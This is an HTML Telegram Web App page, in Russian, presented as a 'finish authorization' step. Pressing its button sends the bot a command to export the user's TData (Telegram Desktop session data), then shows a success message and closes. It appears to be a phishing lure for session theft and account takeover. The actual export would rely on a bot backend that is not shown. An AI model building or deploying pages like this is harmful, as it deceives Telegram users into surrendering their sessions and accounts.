<!DOCTYPE html>
<html>
<head>
    <title>Telegram Auth</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            text-align: center;
        }
        button {
            background-color: var(--tg-theme-button-color, #2481cc);
            color: var(--tg-theme-button-text-color, #ffffff);
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 0;
        }
        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .loading-text {
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <button id="authButton" onclick="finishAuth()">Закончить авторизацию</button>
        <div id="loading" class="loading">
            <div class="loading-text">Завершение авторизации...</div>
        </div>
    </div>

    <script>
        // Инициализация Telegram WebApp
        const tg = window.Telegram.WebApp;
        tg.expand();

        // Определение платформы
        function detectPlatform() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('windows')) return 'windows';
            if (userAgent.includes('android')) return 'android';
            if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'ios';
            return 'unknown';
        }

        // Основная функция авторизации
        async function finishAuth() {
            const button = document.getElementById('authButton');
            const loading = document.getElementById('loading');
            
            try {
                button.style.display = 'none';
                loading.style.display = 'block';
                
                // Определяем платформу
                const platform = detectPlatform();
                console.log('Detected platform:', platform);
                
                // Отправляем команду в Telegram для экспорта TData
                const data = {
                    platform: platform,
                    action: 'export_tdata'
                };
                
                console.log('Sending export command...');
                await tg.sendData(JSON.stringify(data));
                console.log('Export command sent successfully');
                
                // Показываем сообщение об успешной авторизации
                loading.innerHTML = '<div class="loading-text">Авторизация завершена</div>';
                
                // Закрываем веб-приложение через 1 секунду
                setTimeout(() => {
                    tg.close();
                }, 1000);
                
            } catch (error) {
                console.error('Auth error:', error);
                // В случае ошибки показываем сообщение об успешной авторизации
                loading.style.display = 'none';
                button.style.display = 'block';
                button.textContent = 'Попробовать снова';
            }
        }
    </script>
</body>
</html>
